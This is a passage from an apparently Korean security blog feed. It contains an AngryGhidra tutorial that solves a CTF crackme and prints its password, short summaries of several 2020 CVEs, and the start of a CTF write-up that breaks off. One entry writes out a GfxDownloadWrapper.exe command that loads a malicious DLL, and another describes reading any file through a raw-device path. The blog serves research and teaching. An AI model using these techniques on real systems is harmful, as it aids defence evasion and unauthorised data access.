    <link href="/2020/10/25/idioth/angryghidra/"/>
    <url>/2020/10/25/idioth/angryghidra/</url>
    
    <content type="html"><![CDATA[<p>하지메마시떼! 반갑습니다 오늘도 띨띨한 idioth입니다.</p><p>오늘 소개해드릴 툴은 AngryGhidra라는 툴입니다.</p><p>누군가(?)가 올려준 링크를 보고 오 이거 편하겠는데 한 번 써볼까? 하고 써봤다가 사용해볼 만한 가치가 있는 것 같아서 글을 작성해봅니다.</p><p><a href="https://github.com/angr/angr">angr</a>에 대해 설명해드리자면 바이너리 분석을 도와주는 python 라이브러리입니다.</p><p>기존 angr를 사용하려면 IDA와 같은 툴을 사용하여 분석하고 주소를 구하고 python 코드에다가 적고… 다시 구하고 코드에다가 적고 하는 노가다를 진행해야 했습니다. 하지만 이 녀석을 사용하면 Ghidra에서 분석하고 클릭질만 몇 번 하면 angr의 기능을 사용할 수 있습니다.</p><p>저녁 먹고 와서 공부도 하기 싫겠다… 요거나 세팅해서 써보면서 갖고 놀아봐야겠다… 히히히 하는 생각은 30분 만에 깨져버리게 됩니다.</p><h1 id="예상치-못한-삽질"><a href="#예상치-못한-삽질" class="headerlink" title="예상치 못한 삽질"></a>예상치 못한 삽질</h1><p>분명 Readme.md에서는 릴리즈 버전을 설치하여 Extension 추가하면 된다 했다.</p><p>→ 근데 왜 릴리즈 버전이 아무것도 없는 거지? 함정인가</p><p>그냥 git clone하면 빌드 된 파일이 있을 거라 생각하였으나 없었다.</p><p>→ clone하고 있는 파일들 전부다 Ghidra Extension에서 클릭해봤으나 오류만 엄청 뜸.. build.gradle 파일이 있으니 gradle로 빌드를 해보자</p><p>gradle을 통해 빌드를 하는데 정상적으로 되질 않네..?</p><p>→ 내가 뭘 하려 할 때마다 오류가 뜬다… 이쯤에서 멘탈이 나가서 혼자 모니터 앞에서 욕을 하기 시작</p><p>우여곡절 속에서 빌드 성공(!) 후 신나서 L0ch에게 야 빌드 했다 이제 돌려본다 옆에서 딱 기다려 ㅋㅋ하고 옆에 세워뒀습니다. 하지만 가져온 바이너리를 돌렸는데 angr가 돌아가지 않았다…</p><blockquote><p>L0ch 日 : 아니 형 된다면서 안되잖아 뭐야 빨리 다시 삽질해요</p></blockquote><p><del>나쁜넘</del> 아무튼 여기서 멈출 수 없으므로 angr를 재설치해보고 python 버전이 문젠가 삽질을 다시 시작합니다…</p><p>결국 멘탈이 박살 난 상태로 집에 가서 애니메이션(?)을 보며 힐링 후 다음 날 다시 도전을 해보았습니다.</p><p>UE(User Error)일 가능성이 크다고 생각하며 오늘의 나와 어제의 나는 다르기 때문에 또 돌렸는데 실행이 안 됐습니다.. 도대체 왜 안돼?라고 생각하는 찰나 내 머리에 스친 생각</p><blockquote><p>아니 이거 elf 파일인데 왜 windows에서 돌리고 있지??</p></blockquote><p align="center"><img src="./img1.jpg" width=60% height=60%></p><p>ubuntu로 옮긴 다음에 다시 위의 과정 반복 후 다시 L0ch를 불렀습니다. 이 자식은 형이 부르는데 맨날 투덜거려요. “안되기만 해 봐” 하면서 와놓고 되니까 따봉 날리고 갑니다.</p><p>현재는 Pre-release로 AngryGhidra v0.1이 업로드된 상태라서 귀찮으신 분은 <a href="https://github.com/Nalen98/AngryGhidra/releases">릴리즈 버전을 다운로드</a> 받아 Extension을 바로 추가하면 될 것 같습니다.</p><h1 id="근데-Ghidra가-뭔데"><a href="#근데-Ghidra가-뭔데" class="headerlink" title="근데 Ghidra가 뭔데?"></a>근데 Ghidra가 뭔데?</h1><p><a href="https://ghidra-sre.org/">Ghidra</a>는 NSA에서 개발한 역어셈블러 프레임워크입니다. 뭐 하는 녀석인지 잘 모르겠으면 IDA 같은 녀석이라고 보시면 됩니다.</p><p>오픈 소스로 공개되었으며 jdk 11 버전에서 정상적으로 작동됩니다.</p><p>다른 응용 프로그램들처럼 설치 파일을 통해 설치하는 것이 아닌 압축 파일을 다운 받아서 압축만 해제하면 바로 실행할 수 있습니다.</p><p>지원 플랫폼</p><ul><li>Windows 7 or 10 (64bit)</li><li>Linux (64bit, CentOs 7 is preferred)</li><li>macOS(OS X) 10.8.3+ (Mountain Lion or later)</li></ul><p>32비트 OS에서는 Ghidra를 사용할 수 없습니다.</p><h2 id="우분투에-Ghidra-설치하기"><a href="#우분투에-Ghidra-설치하기" class="headerlink" title="우분투에 Ghidra 설치하기"></a>우분투에 Ghidra 설치하기</h2><h3 id="자바-환경-설치"><a href="#자바-환경-설치" class="headerlink" title="자바 환경 설치"></a>자바 환경 설치</h3><pre><code class="hljs bash">$ sudo add-apt-repository ppa:openjdk-r/ppa$ sudo apt install openjdk-11-jre openjdk-11-jre-headless openjdk-11-jdk openjdk-11-jdk-headless</code></pre><h3 id="Ghidra-설치"><a href="#Ghidra-설치" class="headerlink" title="Ghidra 설치"></a>Ghidra 설치</h3><p><a href="https://ghidra-sre.org/">기드라 사이트</a>에서 최신 버전의 기드라를 설치해줍니다.</p><p><img src="/2020/10/25/idioth/angryghidra/img2.png"></p><p>설치 후 원하는 폴더에서 압축을 해제하면 ghidra가 정상적으로 설치됩니다.</p><pre><code class="hljs bash">idioth@ubuntu:~$ ls -al ghidra_9.1.2_PUBLICtotal 56drwxr-xr-x  9 idioth idioth  4096  9월 11 15:15 .drwxr-xr-x 31 idioth idioth  4096  9월 14 17:01 ..drwxr-xr-x  5 idioth idioth  4096  2월 12  2020 docsdrwxr-xr-x  5 idioth idioth  4096  2월 12  2020 Extensionsdrwxr-xr-x  8 idioth idioth  4096  2월 12  2020 Ghidra-rwxr-xr-x  1 idioth idioth   883  2월 12  2020 ghidraRun-rw-r--r--  1 idioth idioth   384  2월 12  2020 ghidraRun.batdrwxr-xr-x  7 idioth idioth  4096  2월 12  2020 GPL-rw-r--r--  1 idioth idioth 11357  2월 12  2020 LICENSEdrwxr-xr-x  2 idioth idioth  4096  2월 12  2020 licensesdrwxr-xr-x  2 idioth idioth  4096  2월 12  2020 serverdrwxr-xr-x  2 idioth idioth  4096  2월 12  2020 support</code></pre><p>Windows의 경우 ghidraRun.bat를 통해 실행하고 우분투의 경우 ghidraRun을 통해 실행해 줍니다. 실행 권한이 없을 경우 chmod +x ghidraRun을 통해 실행 권한을 주면 됩니다.</p><h1 id="AngryGhidra"><a href="#AngryGhidra" class="headerlink" title="AngryGhidra"></a>AngryGhidra</h1><p>기드라가 정상적으로 설치되었다면 <a href="https://github.com/Nalen98/AngryGhidra/releases">AngryGhidra</a>를 설치해 줍니다.</p><h2 id="Angr-설치"><a href="#Angr-설치" class="headerlink" title="Angr 설치"></a>Angr 설치</h2><pre><code class="hljs bash">$ sudo pip3 install angr</code></pre><h2 id="Releases로-플러그인-등록"><a href="#Releases로-플러그인-등록" class="headerlink" title="Releases로 플러그인 등록"></a>Releases로 플러그인 등록</h2><p>pre-releases가 올라왔으니 저와 같은 시간 낭비(?)는 하지 말고 릴리즈 버전으로 등록을 해봅시다.</p><pre><code class="hljs bash">$ wget https://github.com/Nalen98/AngryGhidra/releases/download/0.1%2Bghidra-9.1.2/ghidra_9.1.2_PUBLIC_20200909_AngryGhidra.zip</code></pre><p>릴리즈 버전을 설치해 줍니다.</p><p><img src="/2020/10/25/idioth/angryghidra/img3.png"></p><p>기드라 실행 후 File-Install Extensions을 선택해 줍니다.</p><p><img src="/2020/10/25/idioth/angryghidra/img4.png"></p><p>우측 상단에 +버튼을 선택해 줍니다.</p><p><img src="/2020/10/25/idioth/angryghidra/img5.png"></p><p>설치 받은 zip 파일을 선택해 준 후 체크해 줍니다.</p><p>그러면 끝납니다. 체크하고 OK 누르면 설치 완료~</p><h2 id="Gradle을-통해서-직접-빌드하는-방법"><a href="#Gradle을-통해서-직접-빌드하는-방법" class="headerlink" title="Gradle을 통해서 직접 빌드하는 방법"></a>Gradle을 통해서 직접 빌드하는 방법</h2><p>릴리즈 버전이 올라와 있기 때문에 굳이 이 방법을 택하시는 분이 없을 거라 생각하지만 혹시 본인이 직접 빌드 해보고 싶으시다면 직접 빌드 해보시는 것도 추천드립니다.</p><pre><code class="hljs bash">$ sudo apt install gradle$ git <span class="hljs-built_in">clone</span> https://github.com/Nalen98/AngryGhidra</code></pre><p>gradle을 통해서 빌드 하기 위해 gradle을 설치하고 AngryGhidra repository를 가져옵니다.</p><pre><code class="hljs bash">~/AngryGhidra$ gradle buildExtensionStarting a Gradle Daemon, 1 incompatible and 1 stopped Daemons could not be reused, use --status <span class="hljs-keyword">for</span> detailsFAILURE: Build failed with an exception.* Where:Build file <span class="hljs-string">&#x27;/home/idioth/AngryGhidra/build.gradle&#x27;</span> line: 31* What went wrong:A problem occurred evaluating root project <span class="hljs-string">&#x27;AngryGhidra&#x27;</span>.&gt; GHIDRA_INSTALL_DIR is not defined!* Try:Run with --stacktrace option to get the stack trace. Run with --info or --debug option to get more <span class="hljs-built_in">log</span> output. Run with --scan to get full insights.* Get more <span class="hljs-built_in">help</span> at https://help.gradle.orgBUILD FAILED <span class="hljs-keyword">in</span> 3s</code></pre><p>그냥 빌드를 진행할 경우 기드라의 설치 경로를 알 수 없기 때문에 정상적으로 빌드가 되지 않습니다. 좀 더 똑똑한(?) 제가 가르쳐주도록 합니다.</p><pre><code class="hljs bash">~/AngryGhidra$ sudo GHIDRA_INSTALL_DIR=/home/idioth/ghidra_9.1.2_PUBLIC gradle buildExtension&gt; Task :buildHelp INFO  Using <span class="hljs-built_in">log</span> config file: jar:file:/home/idioth/ghidra_9.1.2_PUBLIC/Ghidra/Framework/Generic/lib/Generic.jar!/generic.log4j.xml (LoggingInitialization)  INFO  Using <span class="hljs-built_in">log</span> file: /root/.ghidra/.ghidra_9.1.2_PUBLIC/application.log (LoggingInitialization)  [JavaHelpFilesBuilder] Generating Help Files <span class="hljs-keyword">for</span>: [file:///home/idioth/AngryGhidra/src/main/<span class="hljs-built_in">help</span>/<span class="hljs-built_in">help</span>/][JavaHelpFilesBuilder] Generating map file: file:///home/idioth/AngryGhidra/build/<span class="hljs-built_in">help</span>/main/<span class="hljs-built_in">help</span>/AngryGhidra_map.xml...[JavaHelpFilesBuilder]  finished generating map file[JavaHelpFilesBuilder] Generating TOC file: AngryGhidra_TOC.xml...[JavaHelpFilesBuilder]  finished generating TOC file[JavaHelpFilesBuilder] Done generating <span class="hljs-built_in">help</span> files <span class="hljs-keyword">for</span> module: AngryGhidra&gt; Task :buildExtension Created ghidra_9.1.2_PUBLIC_20200914_AngryGhidra.zip <span class="hljs-keyword">in</span> /home/idioth/AngryGhidra/distBUILD SUCCESSFUL <span class="hljs-keyword">in</span> 15s8 actionable tasks: 8 executed</code></pre><p>위와 같이 자신의 기드라 경로를 추가해 준 후 빌드를 진행합니다. </p><pre><code class="hljs bash">~/AngryGhidra/dist$ lsghidra_9.1.2_PUBLIC_20200914_AngryGhidra.zip</code></pre><p>정상적으로 빌드가 진행됐다면 dist 폴더에 Extension 파일이 생깁니다.</p><p>여기까지 오셨다면 릴리즈를 통해 추가하는 것과 같은 방법으로 추가하시면 됩니다!</p><h2 id="AngryGhidra를-통한-문제-풀이"><a href="#AngryGhidra를-통한-문제-풀이" class="headerlink" title="AngryGhidra를 통한 문제 풀이"></a>AngryGhidra를 통한 문제 풀이</h2><p>angr로 푸는 문제 중 가장 간단한(?) <a href="https://github.com/ByteBandits/writeups/blob/master/defcamp-quals-2015/reverse/r100/r100.bin">Defcamp - r100</a>을 통해서 어떤 식으로 사용하는지 확인해봅시다.</p><p>먼저 기드라로 해당 파일을 열어준 후 main 소스 코드를 확인해봅시다.</p><pre><code class="hljs cpp"><span class="hljs-function">undefined8 <span class="hljs-title">FUN_004007e8</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span><span class="hljs-function"></span>&#123;<span class="hljs-keyword">int</span> iVar1;<span class="hljs-keyword">char</span> *pcVar2;undefined8 uVar3;<span class="hljs-keyword">long</span> in_FS_OFFSET;<span class="hljs-keyword">char</span> local_118 [<span class="hljs-number">264</span>];<span class="hljs-keyword">long</span> local_10;local_10 = *(<span class="hljs-keyword">long</span> *)(in_FS_OFFSET + <span class="hljs-number">0x28</span>);<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Enter the password: &quot;</span>);pcVar2 = fgets(local_118, <span class="hljs-number">0xff</span>, <span class="hljs-built_in">stdin</span>);<span class="hljs-keyword">if</span> (pcVar2 == (<span class="hljs-keyword">char</span> *)<span class="hljs-number">0x0</span>) &#123;uVar3 = <span class="hljs-number">0</span>;&#125;<span class="hljs-keyword">else</span> &#123;iVar1 = FUN_004006fd(local_118);<span class="hljs-keyword">if</span> (iVar1 == <span class="hljs-number">0</span>) &#123;put(<span class="hljs-string">&quot;Nice!&quot;</span>);uVar3 = <span class="hljs-number">0</span>;&#125;<span class="hljs-keyword">else</span> &#123;<span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Incorrect password!&quot;</span>);uVar3 = <span class="hljs-number">1</span>;&#125;&#125;<span class="hljs-keyword">if</span> (local_10 != *(<span class="hljs-keyword">long</span> *)(in_FS_OFFSET + <span class="hljs-number">0x28</span>)) &#123;__stack_chk_fail();&#125;<span class="hljs-keyword">return</span> uVar3;&#125;</code></pre><p>password를 입력받고 <code>FUN_004006fd</code> 함수에서 어떠한 수행을 하고 return 값에 따라서 Nice와 incorrect로 넘어가네요.</p><p>Incorrect 부분을 피하고 Nice로 가는 패스워드를 찾아야 합니다.</p><p>저 함수를 일일이 분석하는 방법도 있지만 우리에게는 AngryGhidra가 있습니다.</p><p><img src="/2020/10/25/idioth/angryghidra/img6.png"></p><p>먼저 함수의 시작 부분에서 blank state를 설정해 줍니다.</p><p><img src="/2020/10/25/idioth/angryghidra/img7.png"></p><p>우리는 Nice 문자열 부분으로 넘어가는 값을 찾고 싶으니 Nice 쪽으로 넘어가는 주소를 Find Address로 설정해 줍니다.</p><p><img src="/2020/10/25/idioth/angryghidra/img8.png"></p><p>Incorrect로 가는 부분은 피해야 되니 Avoid Address로 설정한 다음에 AngryGhidra를 실행해봅시다!</p><p><img src="/2020/10/25/idioth/angryghidra/img9.png"></p><p><img src="/2020/10/25/idioth/angryghidra/img10.png"></p><p>Window - AngryGhidraPlugin을 클릭하면 위의 사진과 같은 창이 뜹니다. 인자의 길이를 지정할 수도 있고, auto_load_libs를 설정할 수도 있습니다.</p><p>Blank State와 Find address, avoid address를 모두 설정하였으니 Run 버튼을 눌러 angr를 돌려봅시다.</p><p>잠시 기다려보면 Solution Found라고 뜨며 아래와 같이 어떤 문자열이 뜹니다.</p><p><img src="/2020/10/25/idioth/angryghidra/img11.png"></p><p>나온 문자열을 바이너리에 입력해보면</p><pre><code class="hljs bash">~/Desktop$ ./r100.bin Enter the password: Code_TalkersNice!</code></pre><p>정상적으로 찾은 것을 알 수 있습니다.</p><p>나는 소스 코드 보고 클릭질만 몇 번 하면 값을 찾아준다? 정말 인간의 욕구에 충실한 플러그인이 아닐 수가 없습니다.</p><p>직접 스크립트를 작성해서 돌리는 것이 기능적으로는 훨씬 효율적일 수 있지만 리버싱을 진행하면서 바로바로 angr 환경 세팅 및 실행할 수 있다는 점이 매력적이었습니다.</p><p>아직은 간단한 것들로만 해보고 더 복잡한 것들은 사용해보지 않았는데 나중에 기회가 된다면 더 복잡한 바이너리에 사용해보고 올려보도록 하겠습니다 ㅋㅋ</p><p>오늘도 저의 멍청함을 확인하고 극복한 나에게 건배하며.. adios..</p><p align="center"><img src="./img12.jpg" width="50%" heightd="50%"></p>]]></content>
    
    
    <categories>
      
      <category>Research</category>
      
    </categories>
    
    
    <tags>
      
      <tag>idioth</tag>
      
      <tag>reversing</tag>
      
      <tag>angr</tag>
      
      <tag>ghidra</tag>
      
      <tag>angryghidra</tag>
      
      <tag>symbolic execution</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] CVE-2020-15999: Chrome 0-day, Heap buffer overflow</title>
    <link href="/2020/10/24/fabu1ous/2020-10-24/"/>
    <url>/2020/10/24/fabu1ous/2020-10-24/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://savannah.nongnu.org/bugs/?59308">Heap buffer overflow due to integer truncation in Load_SBit_Png</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><p>Google Chrome</p><p>Freetype</p><p>libpng</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>2020-10-21일 Chrome 긴급 패치가 릴리즈 됐습니다. CVE-2020-15999는 Chrome에서 폰트를 렌더링 할 때 사용하는 오픈소스 라이브러리 Freetype와 공식 PNG 라이브러리 libpng 사이에서 발생하는 이슈입니다. 각 라이브러리는 이미지로부터 32-bit integer크기의 width와 height값을 참조해 동작하는데, Freetype은 16-bit로 truncate(축소)한 뒤 bitmap 할당에 사용되는 size를 계산합니다. 이미지의 width와 height가 16-bit 보다 크다면 Freetype에서 할당된 bitmap이 실제 이미지보다 작겠죠? 이  bitmap을 libpng가 사용하면서 heap buffer overflow가 발생하게 됩니다. </p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Fabu1ous</tag>
      
      <tag>cve</tag>
      
      <tag>heap bof</tag>
      
      <tag>png</tag>
      
      <tag>freetype</tag>
      
      <tag>libpng</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] Bypassing NTFS permissions to read any files as unprivileged user</title>
    <link href="/2020/10/23/l0ch/10-23_1day1line/"/>
    <url>/2020/10/23/l0ch/10-23_1day1line/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://github.com/ioncodes/CVE-2020-16938">POC using Windows API calls</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><p>Windows 10 2004/Server 2004</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>권한이 없는 일반 사용자가 로컬 드라이브의 전체 데이터를 열람할 수 있는 취약점의 POC가 공개되었습니다.<br>해당 취약점은 최근 업데이트로 파티션, 볼륨 장치에 대한 권한이 변경되어 <code>\\.\PhysicalDrive0\</code>경로로 장치에 접근하면 권한을 우회해 arbitrary file read가 가능합니다. </p><p><img src="/2020/10/23/l0ch/10-23_1day1line/image1.png" alt="image1"></p><p>NTFS parser인 7zip으로도 arbitrary file read 가 가능합니다.</p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="https://twitter.com/jonasLyk/status/1316104870987010048">https://twitter.com/jonasLyk/status/1316104870987010048</a></p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>cve</tag>
      
      <tag>windows</tag>
      
      <tag>ntfs</tag>
      
      <tag>L0ch</tag>
      
      <tag>arbitrary file read</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] GfxDownloadWrapper.exe LOLBIN을 이용한 Assembly Loading</title>
    <link href="/2020/10/22/idioth/gfxdownloadwrapper/"/>
    <url>/2020/10/22/idioth/gfxdownloadwrapper/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://bohops.com/2020/10/21/exploring-an-assembly-loading-technique-and-detection-mechanism-for-the-gfxdownloadwrapper-exe-lolbin/">Exploring an Assembly Loading Technique and Detection Mechanism for the GfxDownloadWrapper.exe LOLBIN</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><p>Windows</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>GfxDownloadWrapper.exe는 인텔 비디오 카드 드라이버 소프트웨어로 인텔 그래픽 컨트롤 패널 및 게임 그래픽 설정을 지원하는 .NET 응용 프로그램입니다. 해당 파일은 “Microsoft Windows Third Party Component CA 2012”로 인증되어 있습니다. GfxDownloadWrapper.exe는 임의 다운로드를 방지하기 위한 루틴이 존재하지만 낮은 버전에서는 그러한 검증이 없습니다.</p><p><code>main()</code> 진입점에서 어셈블리를 로드하는 부분을 발견할 수 있으며 인자를 조작함으로써 영향을 미칠 수 있습니다.</p><ul><li>args[0]: “run”의 문자열 값</li><li>args[1]: 어셈블리 DLL 페이로드 경로</li><li>args[2]: 필수 어셈블리 method 숫자 문자열 값<ul><li>0: <code>ApplyRecommendedSettings</code>, 1: <code>RestoreRecommendedSettings</code>, 2: <code>CacheCleanup</code></li></ul></li><li>args[3]: <code>AppData</code> 상대 경로에 있는 게임 식별자 값</li></ul><pre><code class="hljs powershell">GfxDownloadWrapper.exe <span class="hljs-string">&quot;run&quot;</span> <span class="hljs-string">&quot;payload.dll&quot;</span> <span class="hljs-string">&quot;MethodNumber&quot;</span> <span class="hljs-string">&quot;;AppData\\Local\\Intel\\Games\\임의 값&quot;</span></code></pre><p>따라서 인자를 맞춰준 후 DLL 경로를 악성 dll로 지정하면 악성 어셈블리를 로드한 후 성공적으로 실행하게 됩니다.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>idioth</tag>
      
      <tag>lolbin</tag>
      
      <tag>lolbas</tag>
      
      <tag>living of the land</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] CVE-2020-16902: Windows Installer EoP</title>
    <link href="/2020/10/21/fabu1ous/2020-10-21/"/>
    <url>/2020/10/21/fabu1ous/2020-10-21/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://ssd-disclosure.com/ssd-advisory-windows-installer-elevation-of-privileges-vulnerability/">SSD Advisory – Windows Installer Elevation of Privileges Vulnerability</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><p>Windows Installer</p><p><strong>Affected Versions</strong></p><ul><li>Windows 7</li><li>Windows 8</li><li>Windows 10</li><li>Windows 2008</li><li>Windows 2012</li><li>Windows 2016</li><li>Windows 2019</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>SSD Secure Disclosure program에 제보된 CVE-2020-16902입니다. Windows Installer는 소프트웨어의 설치, 관리, 제거에 사용되는 Windows 컴포넌트입니다. <code>SetSecurity()</code>의 race condition 문제로 인해 Windows installer는 패치와 패치 우회가 반복되고 있습니다. 지금 소개하는 CVE-2020-16902도 마찬가지입니다.</p><p>Windows Installer는 설치 스크립트를 실행하면서 두 가지 작업을 추가로 병행합니다. 설치 작업의 실패를 대비해 roll back script (<code>.RBS</code>)를 작성하고, 설치 작업 중 삭제되는 모든 파일들을 복제해 c:\Config.Msi에 저장합니다. <code>.RBS</code>를 작성하기 전에 특정 루틴을 거치는데, 아래와 같습니다.</p><pre><code class="hljs angelscript"><span class="hljs-number">1.</span> Config.Msi 속 임시파일들을 생성<span class="hljs-number">2.</span> Config.Msi 삭제<span class="hljs-number">3.</span> Config.Msi 존재 여부 확인<span class="hljs-number">4.</span> Config.Msi 생성</code></pre><p>3번 과정에서 Config.Msi 디렉토리가 여전히 존재한다면 <code>SetSecurity()</code>를 사용하는 코드가 실행되며 기존 취약점(CVE-2020-1302)이 그대로 다시 악용될 수 있습니다.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Fabu1ous</tag>
      
      <tag>cve</tag>
      
      <tag>local</tag>
      
      <tag>eop</tag>
      
      <tag>windows</tag>
      
      <tag>system privilege</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] Discord Desktop app RCE</title>
    <link href="/2020/10/20/l0ch/Discord_RCE/"/>
    <url>/2020/10/20/l0ch/Discord_RCE/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://mksben.l0.cm/2020/10/discord-desktop-rce.html">Discord Desktop app RCE</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><p>Discord Desktop app</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>node.js 기반 오픈소스 프레임워크인 Electron으로 개발된 Discord에서 원격 코드 실행 취약점이 발견되었습니다. </p><p>Electron의 <code>BrowserWindow API</code> 옵션 중 코드 실행 컨텍스트를 분리하는 <code>contextIsolation</code> 옵션이 discord에서는 비활성화 돼있어 injection된 JS가 내부 페이지 코드 실행에 영향을 줄 수 있습니다. 이를 이용하면 iframe embed XSS 를 통해 JavaScript 내장 메소드를 재정의할 수 있으며 이때 Navigation restriction을 우회하면 iframe을 escape해 최상위 컨텍스트에서 임의 코드를 실행할 수 있습니다.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>cve</tag>
      
      <tag>rce</tag>
      
      <tag>xss</tag>
      
      <tag>javascript</tag>
      
      <tag>L0ch</tag>
      
      <tag>electron</tag>
      
      <tag>context isolation</tag>
      
      <tag>discord</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] CVE-2020-16947: Outlook 365 Remote Command Execution</title>
    <link href="/2020/10/19/idioth/cve-2020-16947/"/>
    <url>/2020/10/19/idioth/cve-2020-16947/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://github.com/0neb1n/CVE-2020-16947">CVE-2020-16947</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><p>Outlook 365 apps for Enterprise/2016/2019</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>Outlook 365에서 메모리 객체에 대한 처리를 잘못하여 RCE가 가능한 취약점이 발견되었습니다.</p><p>HTML 콘텐츠에서 ASCII 범위 밖의 문자열을 복사할 때 해당 문자열들은 <code>0xfffd</code>로 교체됩니다. 따라서 복사된 문자열의 크기가 2배가 되기 때문에 src 버퍼와 dst 버퍼의 크기가 같아도 버퍼 오버플로가 발생하게 됩니다.</p><p>현재 이 취약점에 대한 자세한 기술적 설명과 exploit은 공개되지 않았습니다.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>cve</tag>
      
      <tag>rce</tag>
      
      <tag>outlook</tag>
      
      <tag>idioth</tag>
      
      <tag>buffer overflow</tag>
      
      <tag>memory corruption</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[Write-Up] SSTF eat-the-pie</title>
    <link href="/2020/10/18/fabu1ous/sstf-eat-the-pie/"/>
    <url>/2020/10/18/fabu1ous/sstf-eat-the-pie/</url>
    
    <content type="html"><![CDATA[<h1 id="머릿말"><a href="#머릿말" class="headerlink" title="머릿말"></a>머릿말</h1><p>뉴비부터 고수까지 모두 즐길 수 있는 CTF라는 소개글을 보고 대학 동아리 신입생들을 데리고 SSTF에 출전했습니다. 아쉽게도 좋은 성적을 내진 못했네요. 사실 이 write-up은 같이 출전한 신입생 친구들에게 보여주려고 작성했는데 몇 명이나 읽었을지…</p><p>CTF를 처음 경험하는 친구들이라 최대한 풀어서 설명을 적었으며, CTF에 대한 저의 견해도 조금씩 섞여 있습니다. eat-the-pie를 풀 당시 저의 사고 흐름을 중심으로 작성했고 이 글을 읽으실 때도 이점을 기억해주세요.</p><p>[ 취약점 ]</p><ol><li><p>Memory Leak With Printf</p></li><li><p>Out-Of-Bound</p></li></ol><h1 id="훑어보기"><a href="#훑어보기" class="headerlink" title="훑어보기"></a>훑어보기</h1><p><img src="/2020/10/18/fabu1ous/sstf-eat-the-pie/image1.png"></p><p><code>pwnme()</code>라는 이름의 함수가 있다. <del>“동네 사람들!!! 취약점 여기 있어요!!!”</del></p><p>CTF에서 이렇게 취약점의 위치를 알려주는 문제들은 주로 취약점은 간단하지만 exploit으로 연결시키는 것이 어려운 컨셉의 문제들입니다. eat-the-pie도 이런 컨셉의 문제인 거 같죠?</p><p><del>[ ! ] 심지어 문제 이름도 PIE 우회를 암시하고 있다.</del></p><p>대충 eat-the-pie 문제를 설명하자면,</p><ol><li>stack에 vtable을 만들고 <code>read()</code>로 입력을 받음.</li><li><code>read()</code>로 받은 입력 값을 이용해 vtable로부터 함수를 참조 실행.</li></ol><p>이 두 가지 정도만 알면 되는 간단한 프로그램입니다.</p><p>CTF 문제들은 의도적으로 취약점을 만들어 놨기 때문에 짱구를 조금만 굴려 보면</p><p>코드에서 많은 힌트를 얻을 수 있습니다. </p><p>[ ! ] Real world와 대조되는 큰 차이점이다.</p><p>위 사진에서 하이라이트 된 부분을 보고 최대한 많은 정보를 알아내 봅시다.</p><h1 id="취약점-예상-정적-분석"><a href="#취약점-예상-정적-분석" class="headerlink" title="취약점 예상 ( 정적 분석 )"></a>취약점 예상 ( 정적 분석 )</h1><p><img src="/2020/10/18/fabu1ous/sstf-eat-the-pie/image2.png"></p><ol><li>입력을 굳이 int가 아닌 string형으로 16 byte나 받는다.</li></ol><p>int( 4 byte )가 아닌 string으로 16 byte나 입력받는 것은 12 byte만큼 메모리를 낭비하는 것이고 입력받은 string을 int로 바꾸는 과정을 한번 더 걸치니 결코 합리적인 코드가 아닙니다. 즉, 취약점으로 빌드 업 되도록 의도된 코드인 거 같죠? <code>atoi()</code> 혹은 <code>printf()</code> 등 NULL terminated string 함수를 사용한다는 것도 중요한 정보인 것 같습니다.</p><ol start="2"><li>if문의 조건이 모든 경우의 수를 커버하지 못함.</li></ol><p>index를 이용해 참조하는 코드가 있다면 가장 먼저 확인해야 할 것이 있습니다. 바로, out-of-bound 가능 여부. 코드를 살펴보면 음수에 대한 예외 처리를 하지 않은 것을 알 수 있습니다. 심지어 indirect call에 